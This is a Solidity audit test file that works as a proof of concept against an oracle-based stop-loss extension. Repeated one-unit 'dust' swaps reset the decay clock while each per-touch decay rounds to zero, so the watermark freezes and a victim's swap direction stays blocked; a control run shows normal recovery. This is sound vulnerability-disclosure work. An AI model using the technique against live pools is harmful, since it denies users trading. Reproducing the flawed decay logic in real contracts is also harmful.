// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {MetricOmmPoolBaseTest, Q64} from "@metric-core-test/MetricOmmPool.base.t.sol";
import {BinState} from "@metric-core/types/PoolStorage.sol";
import {ExtensionOrders} from "@metric-core/types/PoolExtensionsConfig.sol";
import {ExtensionOrderTestLib} from "@metric-core-test/ExtensionOrderTestLib.sol";
import {IOracleValueStopLossExtension} from "../../contracts/interfaces/extensions/IOracleValueStopLossExtension.sol";
import {OracleValueStopLossExtension} from "../../contracts/extensions/OracleValueStopLossExtension.sol";

/// @notice Demonstrates that frequent allowed-direction swaps can prevent a nonzero
///         stop-loss watermark decay from ever accumulating across time.
contract OracleValueStopLossDecayFreezeAuditTest is MetricOmmPoolBaseTest {
  uint256 private constant E6 = 1e6;
  uint256 private constant E8 = 1e8;
  uint32 private constant DRAWDOWN_E6 = 50_000; // 5%
  uint32 private constant DECAY_PER_SECOND_E8 = 58; // Approximately 5% per day.

  // A token1/token0 mark of 0.00002 is representative of an 18-decimal
  // stablecoin/BTC-wrapper pool at 50,000 token0 per token1.
  uint128 private constant HIGH_BID_X64 = uint128((Q64 * 2) / 100_000);
  uint128 private constant LOW_BID_X64 = uint128((Q64 * 16) / 1_000_000); // Correct 20% repricing.

  // One million token0 and approximately 5 token1 after priming. The metric is
  // per-share, so scaling TVL does not make the rounding attack harder.
  uint104 private constant SHARES = 1e24;
  uint128 private constant PRIME_TOKEN0_OUT = 25e22; // Convert 25% of the bin at the high mark.
  uint128 private constant VICTIM_TOKEN1_IN = 1e18; // A meaningful one-token1 victim swap.
  uint128 private constant ATTACK_TOKEN0_IN = 1;

  uint256 private constant NATURAL_RECOVERY_TIME = 3 days;
  uint256 private constant ATTACK_INTERVAL = 1 days;
  uint256 private constant ATTACK_DURATION = 30 days;

  OracleValueStopLossExtension internal stopLoss;

  function setUp() public override {
    super.setUp();

    stopLoss = new OracleValueStopLossExtension(address(this));
    oracle.setBidAndAskPrice(HIGH_BID_X64, HIGH_BID_X64 + 1);
    _deployPoolWithStopLoss();
    _approveUsersForPool(address(pool));
    stopLoss.initialize(address(pool), abi.encode(DRAWDOWN_E6, DECAY_PER_SECOND_E8, uint32(0)));

    // The fresh bin starts token0-only. Buying 25% of token0 leaves enough token1
    // inventory and cursor room for repeated tiny swaps in the allowed direction.
    _addLiquidity(0, 0, 0, SHARES, 0);
    _swap(0, users[0], false, _i128ExactOut(PRIME_TOKEN0_OUT), type(uint128).max);

    assertEq(_getCurBinIdx(), 0, "priming swap should remain in bin 0");
    assertGt(_getCurPosInBin(), 0, "priming swap should move inside the bin");
  }

  function test_dailyDustSwapsFreezeDecayAndKeepDirectionBlocked() public {
    (uint256 initialHwm1, uint256 liveMetric1) = _activateStopLossAndAssertBlocked();
    uint256 snapshot = vm.snapshotState();

    _proveNaturalRecovery(initialHwm1, liveMetric1);
    assertTrue(vm.revertToState(snapshot), "failed to restore pre-control state");
    _proveAttackerFreezesDecay(initialHwm1, liveMetric1);
  }

  function _activateStopLossAndAssertBlocked() private returns (uint256 initialHwm1, uint256 liveMetric1) {
    (, initialHwm1) = stopLoss.currentHighWatermarks(address(pool), 0);
    assertGt(initialHwm1, 0, "priming swap must initialize the token1 watermark");

    // At this watermark size, the documented 58 E8 decay rounds to zero over one day.
    // The same decay accumulated over three uninterrupted days is nonzero.
    uint256 maintenanceDecay = (initialHwm1 * DECAY_PER_SECOND_E8 * ATTACK_INTERVAL) / E8;
    uint256 naturalDecay = (initialHwm1 * DECAY_PER_SECOND_E8 * NATURAL_RECOVERY_TIME) / E8;
    assertEq(maintenanceDecay, 0, "the attack relies on per-touch decay rounding to zero");
    assertGt(naturalDecay, 0, "the configured decay must work when time accumulates");

    oracle.setBidAndAskPrice(LOW_BID_X64, LOW_BID_X64 + 1);

    liveMetric1 = _currentToken1Metric();
    uint256 initialFloor = Math.mulDiv(initialHwm1, E6 - DRAWDOWN_E6, E6);
    assertLt(liveMetric1, initialFloor, "the correct repricing must activate the stop-loss");

    // The affected direction is initially blocked as expected.
    vm.expectPartialRevert(IOracleValueStopLossExtension.OracleStopLossTriggered.selector);
    _victimSwap();
  }

  function _proveNaturalRecovery(uint256 initialHwm1, uint256 liveMetric1) private {
    // Control: with no attacker touches, three days of the configured nonzero decay
    // lowers the watermark enough for the same victim swap to succeed.
    vm.warp(block.timestamp + NATURAL_RECOVERY_TIME);
    (, uint256 naturallyDecayedHwm1) = stopLoss.currentHighWatermarks(address(pool), 0);
    uint256 naturallyDecayedFloor = Math.mulDiv(naturallyDecayedHwm1, E6 - DRAWDOWN_E6, E6);
    assertLt(naturallyDecayedHwm1, initialHwm1, "control watermark should decay");
    assertGe(liveMetric1, naturallyDecayedFloor, "control should recover after uninterrupted decay");
    emit log_named_uint("watermark after three-day control decay", naturallyDecayedHwm1);
    _victimSwap();
  }

  function _proveAttackerFreezesDecay(uint256 initialHwm1, uint256 liveMetric1) private {
    // Attack: each allowed-direction dust swap observes only one day of elapsed time.
    // That decrement rounds to zero, but afterSwap still writes lastDecayTs = block.timestamp.
    uint256 attackCalls = ATTACK_DURATION / ATTACK_INTERVAL;
    uint256 totalToken0Paid;
    uint104 cursorBefore = _getCurPosInBin();

    for (uint256 i = 0; i < attackCalls; i++) {
      vm.warp(block.timestamp + ATTACK_INTERVAL);
      (int256 amount0Delta,) = _swap(1, users[1], true, _i128ExactIn(ATTACK_TOKEN0_IN), 0);
      if (amount0Delta > 0) totalToken0Paid += uint256(amount0Delta);
    }

    (, uint104 storedHwm1, uint32 lastDecayTs) = stopLoss.highWatermarks(address(pool), 0);
    (, uint256 attackedHwm1) = stopLoss.currentHighWatermarks(address(pool), 0);
    uint104 cursorAfter = _getCurPosInBin();

    assertEq(lastDecayTs, block.timestamp, "the final dust swap must reset the decay clock");
    assertEq(attackedHwm1, initialHwm1, "daily touches should freeze the watermark exactly");
    assertEq(storedHwm1, initialHwm1, "the stored watermark should never decay");
    assertEq(totalToken0Paid, 0, "zero-delta maintenance swaps should cost no token input");
    assertEq(cursorAfter, cursorBefore, "zero-delta maintenance swaps should not move the cursor");
    assertEq(_getCurBinIdx(), 0, "tiny maintenance swaps should not exhaust the bin");

    emit log_named_uint("initial token1 watermark", initialHwm1);
    emit log_named_uint("live token1 metric after repricing", liveMetric1);
    emit log_named_uint("watermark after thirty attacked days", attackedHwm1);
    emit log_named_uint("daily attacker calls", attackCalls);
    emit log_named_uint("total raw token0 paid by attacker", totalToken0Paid);
    emit log_named_uint("cursor movement over attack", uint256(cursorBefore - cursorAfter));

    // Thirty days later, the control has recovered but the attacked timeline remains blocked.
    vm.expectPartialRevert(IOracleValueStopLossExtension.OracleStopLossTriggered.selector);
    _victimSwap();
  }

  function _victimSwap() private returns (int256 amount0Delta, int256 amount1Delta) {
    return _swap(2, users[2], false, _i128ExactIn(VICTIM_TOKEN1_IN), type(uint128).max);
  }

  function _currentToken1Metric() private view returns (uint256) {
    (uint104 t0, uint104 t1,,,) = _getBinState(0);
    uint256 midPriceX64 = (uint256(LOW_BID_X64) + uint256(LOW_BID_X64 + 1)) / 2;
    uint256 token0InToken1 = Math.mulDiv(uint256(t0), midPriceX64, Q64);
    return Math.mulDiv(token0InToken1, E6, SHARES) + Math.mulDiv(uint256(t1), E6, SHARES);
  }

  function _deployPoolWithStopLoss() private {
    (BinState[] memory nonNegativeBins, BinState[] memory negativeBins) = _defaultBinStateArrays();
    ExtensionOrders memory orders;
    orders.afterSwap = ExtensionOrderTestLib.encodeExtensionOrder(1, 0, 0, 0, 0, 0, 0);

    pool = _deployPoolAndRegister(
      PoolDeployParams({
        priceProvider: address(oracle),
        extensions: _singleExtensionPoolExtensions(address(stopLoss)),
        extensionOrders: orders,
        immutablePriceProvider: true,
        protocolSpreadFeeE6: 0,
        adminSpreadFeeE6: 0,
        curBinDistFromProvidedPriceE6: 0,
        nonNegativeBinStates: nonNegativeBins,
        negativeBinStates: negativeBins,
        protocolNotionalFeeE8: 0,
        adminNotionalFeeE8: 0,
        immutablePriceProviderForRegistry: address(oracle),
        lowestBin: -1,
        highestBin: 0
      })
    );
  }
}
